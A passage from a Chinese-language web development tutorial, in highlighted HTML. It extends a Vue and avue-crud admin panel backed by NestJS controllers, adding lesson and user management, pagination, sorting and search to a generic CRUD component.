class="string">"是否确认删除?"</span>);</span></span><br><span class="line"><span class="actionscript">      &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.delete(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>/<span class="subst">$&#123;row._id&#125;</span>`</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"删除成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    created() &#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetchOption();</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>同样地，按照上述步骤，可以增加课时管理的组件，首先改造<code>admin\src\views\Main.vue</code>,将其中的请求地址修正。然后在服务端<code>server\apps\admin\src\episodes\episodes.controller.ts</code>增加类似上述的接口,同样地，也可以修改<code>server\apps\admin\src\users\users.controller.ts</code>。此时，可以修改一下<code>admin\src\views\courses\CourseCrud.vue</code>为<code>admin\src\views\ResourceCrud.vue</code>,并修改其对应的路由<code>admin\src\router\index.ts</code>。</li></ul><blockquote><p>admin\src\views\Main.vue</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">... &#123; title: <span class="string">"课时管理"</span>, path: <span class="string">"/episodes/list"</span> &#125; ...</span><br></pre></td></tr></table></figure><blockquote><p>server\apps\admin\src\episodes\episodes.controller.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Controller, Get &#125; <span class="keyword">from</span> <span class="string">"@nestjs/common"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Crud &#125; <span class="keyword">from</span> <span class="string">"nestjs-mongoose-crud"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Episode &#125; <span class="keyword">from</span> <span class="string">"@libs/db/models/episodes.model"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; InjectModel &#125; <span class="keyword">from</span> <span class="string">"nestjs-typegoose"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ReturnModelType &#125; <span class="keyword">from</span> <span class="string">"@typegoose/typegoose"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ApiUseTags &#125; <span class="keyword">from</span> <span class="string">"@nestjs/swagger"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Crud</span>(&#123;</span><br><span class="line">  model: Episode</span><br><span class="line">&#125;)</span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">"episodes"</span>)</span><br><span class="line"><span class="meta">@ApiUseTags</span>(<span class="string">"课时"</span>) <span class="comment">// 添加swagger标签</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> EpisodesController &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">    <span class="meta">@InjectModel</span>(Episode)</span></span><br><span class="line"><span class="params">    <span class="keyword">private</span> readonly model: ReturnModelType&lt;<span class="keyword">typeof</span> Episode&gt;</span></span><br><span class="line"><span class="params">  </span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">"option"</span>)</span><br><span class="line">  option() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      title: <span class="string">"课时管理"</span>,</span><br><span class="line">      column: [</span><br><span class="line">        &#123;</span><br><span class="line">          prop: <span class="string">"name"</span>,</span><br><span class="line">          label: <span class="string">"课时名称"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          prop: <span class="string">"file"</span>,</span><br><span class="line">          label: <span class="string">"课时文件"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>server\apps\admin\src\users\users.controller.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">'option'</span>)</span><br><span class="line">  option() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      title: <span class="string">'用户管理'</span>,</span><br><span class="line">      column: [</span><br><span class="line">        &#123;</span><br><span class="line">          prop: <span class="string">'username'</span>,</span><br><span class="line">          label: <span class="string">'用户名称'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      ],</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>为组件增加分页效果，需要增加<code>@on-load=&quot;changePage&quot;</code>，<code>query</code>及修改<code>fetch</code>请求，修改<code>admin\src\views\ResourceCrud.vue</code></li></ul><blockquote><p>admin\src\views\ResourceCrud.vue</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 有option.column再显示，即请求接口获取option所需数据再显示 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">avue-crud</span></span></span><br><span class="line"><span class="tag">      <span class="attr">v-if</span>=<span class="string">"option.column"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:page</span>=<span class="string">"page"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:data</span>=<span class="string">"data.data"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:option</span>=<span class="string">"option"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">row-save</span>=<span class="string">"create"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">row-update</span>=<span class="string">"update"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">row-del</span>=<span class="string">"remove"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">on-load</span>=<span class="string">"changePage"</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">avue-crud</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">"ts"</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; Vue, Component, Prop &#125; <span class="keyword">from</span> <span class="string">"vue-property-decorator"</span>;</span></span><br><span class="line"></span><br><span class="line">  @Component(&#123;&#125;)</span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourceList</span> <span class="keyword">extends</span> <span class="title">Vue</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    @Prop(<span class="built_in">String</span>) resource: string;</span></span><br><span class="line"></span><br><span class="line">    data: any = &#123;&#125;;</span><br><span class="line">    option: any = &#123;&#125;;</span><br><span class="line">    page: any = &#123;</span><br><span class="line"><span class="actionscript">      pageSize: <span class="number">2</span>, <span class="comment">// 默认每页显示</span></span></span><br><span class="line"><span class="actionscript">      pageSizes: [<span class="number">2</span>, <span class="number">5</span>, <span class="number">10</span>], <span class="comment">// 下拉选项。2条每页，5条每页，10条每页</span></span></span><br><span class="line">      total: 0</span><br><span class="line">    &#125;;</span><br><span class="line">    query: any = &#123;</span><br><span class="line"><span class="actionscript">      limit: <span class="number">2</span> <span class="comment">// 限制每页显示条数</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> fetch() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="keyword">this</span>.$http.get(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>`</span>, &#123;</span></span><br><span class="line">        params: &#123;</span><br><span class="line"><span class="actionscript">          query: <span class="keyword">this</span>.query</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.page.total = res.data.total; <span class="comment">// 获取总数</span></span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.data = res.data;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> fetchOption() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="keyword">this</span>.$http.get(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>/option`</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.option = res.data;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> changePage(&#123; pageSize, currentPage &#125;) &#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.query.page = currentPage;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.query.limit = pageSize;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> create(row, done, loading) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.post(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>`</span>, row);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"创建成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line"><span class="actionscript">      done(); <span class="comment">// 停止加载，关闭弹窗</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> update(row, index, done, loading) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> data = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(row)); <span class="comment">//先把对象转字符串，再把字符串转对象，达到复制row而不影响row的效果。</span></span></span><br><span class="line"><span class="actionscript">      <span class="keyword">delete</span> data.$index; <span class="comment">// update请求会把index作为数据，类似&#123; $index:1,... &#125;发送到接口，因此请求前需要清除该字段</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.put(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>/<span class="subst">$&#123;row._id&#125;</span>`</span>, data);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"更新成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line"><span class="actionscript">      done(); <span class="comment">// 停止加载，关闭弹窗</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> remove(row) &#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> <span class="keyword">this</span>.$confirm(<span class="string">"是否确认删除?"</span>);</span></span><br><span class="line"><span class="actionscript">      &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.delete(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>/<span class="subst">$&#123;row._id&#125;</span>`</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"删除成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    created() &#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetchOption();</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>为组件增加排序功能，首先由于定义表格在后端，因此需要修改服务端，如<code>server\apps\admin\src\courses\courses.controller.ts</code>中加上<code>sortable:true</code>，然后修改<code>admin\src\views\ResourceCrud.vue</code>，为其增加<code>@sort-change=&quot;changeSort&quot;</code>及对应变量及函数。</li></ul><blockquote><p>server\apps\admin\src\courses\courses.controller.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">option() &#123;</span><br><span class="line">  <span class="comment">// 函数名称不影响，类型@Watch()写法</span></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    title: <span class="string">'课程管理'</span>,</span><br><span class="line">    column: [</span><br><span class="line">      &#123;</span><br><span class="line">        prop: <span class="string">'name'</span>,</span><br><span class="line">        label: <span class="string">'课程名称'</span>,</span><br><span class="line">        sortable:<span class="literal">true</span> <span class="comment">// 允许排序</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        prop: <span class="string">'cover'</span>,</span><br><span class="line">        label: <span class="string">'课程封面图'</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><blockquote><p>admin\src\views\ResourceCrud.vue</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 有option.column再显示，即请求接口获取option所需数据再显示 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">avue-crud</span></span></span><br><span class="line"><span class="tag">      <span class="attr">v-if</span>=<span class="string">"option.column"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:page</span>=<span class="string">"page"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:data</span>=<span class="string">"data.data"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:option</span>=<span class="string">"option"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">row-save</span>=<span class="string">"create"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">row-update</span>=<span class="string">"update"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">row-del</span>=<span class="string">"remove"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">on-load</span>=<span class="string">"changePage"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">sort-change</span>=<span class="string">"changeSort"</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">avue-crud</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">"ts"</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; Vue, Component, Prop &#125; <span class="keyword">from</span> <span class="string">"vue-property-decorator"</span>;</span></span><br><span class="line"></span><br><span class="line">  @Component(&#123;&#125;)</span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourceList</span> <span class="keyword">extends</span> <span class="title">Vue</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    @Prop(<span class="built_in">String</span>) resource: string;</span></span><br><span class="line"></span><br><span class="line">    data: any = &#123;&#125;;</span><br><span class="line">    option: any = &#123;&#125;;</span><br><span class="line">    page: any = &#123;</span><br><span class="line"><span class="actionscript">      pageSize: <span class="number">2</span>, <span class="comment">// 默认每页显示</span></span></span><br><span class="line"><span class="actionscript">      pageSizes: [<span class="number">2</span>, <span class="number">5</span>, <span class="number">10</span>], <span class="comment">// 下拉选项。2条每页，5条每页，10条每页</span></span></span><br><span class="line">      total: 0</span><br><span class="line">    &#125;;</span><br><span class="line">    query: any = &#123;</span><br><span class="line">      sort: &#123;&#125;,</span><br><span class="line"><span class="actionscript">      <span class="comment">// sort: &#123;</span></span></span><br><span class="line"><span class="actionscript">      <span class="comment">//   _id: -1</span></span></span><br><span class="line"><span class="actionscript">      <span class="comment">// &#125;, // 按_id排序，-1为倒序，1为正序</span></span></span><br><span class="line"><span class="actionscript">      limit: <span class="number">2</span> <span class="comment">// 限制每页显示条数</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> fetch() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="keyword">this</span>.$http.get(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>`</span>, &#123;</span></span><br><span class="line">        params: &#123;</span><br><span class="line"><span class="actionscript">          query: <span class="keyword">this</span>.query</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.page.total = res.data.total; <span class="comment">// 获取总数</span></span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.data = res.data;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> fetchOption() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="keyword">this</span>.$http.get(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>/option`</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.option = res.data;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> changePage(&#123; pageSize, currentPage &#125;) &#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.query.page = currentPage;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.query.limit = pageSize;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> changeSort(&#123; prop, order &#125;) &#123;</span></span><br><span class="line">      if (!order) &#123;</span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.query.sort = <span class="literal">null</span>;</span></span><br><span class="line"><span class="actionscript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.query.sort = &#123;</span></span><br><span class="line"><span class="actionscript">          [prop]: order === <span class="string">"ascending"</span> ? <span class="number">1</span> : <span class="number">-1</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> create(row, done, loading) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.post(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>`</span>, row);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"创建成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line"><span class="actionscript">      done(); <span class="comment">// 停止加载，关闭弹窗</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> update(row, index, done, loading) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> data = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(row)); <span class="comment">//先把对象转字符串，再把字符串转对象，达到复制row而不影响row的效果。</span></span></span><br><span class="line"><span class="actionscript">      <span class="keyword">delete</span> data.$index; <span class="comment">// update请求会把index作为数据，类似&#123; $index:1,... &#125;发送到接口，因此请求前需要清除该字段</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.put(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>/<span class="subst">$&#123;row._id&#125;</span>`</span>, data);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"更新成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line"><span class="actionscript">      done(); <span class="comment">// 停止加载，关闭弹窗</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> remove(row) &#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> <span class="keyword">this</span>.$confirm(<span class="string">"是否确认删除?"</span>);</span></span><br><span class="line"><span class="actionscript">      &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.delete(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>/<span class="subst">$&#123;row._id&#125;</span>`</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"删除成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    created() &#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetchOption();</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>为组件增加搜索及模糊查询功能。依然需要先在后端加上<code>search：true</code>，也可以按需加上<code>regex: true,</code>，例如：<code>server\apps\admin\src\courses\courses.controller.ts</code>。然后在组件中增加监听搜索功能<code>@search-change=&quot;search&quot;</code>。</li></ul><blockquote><p>server\apps\admin\src\courses\courses.controller.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 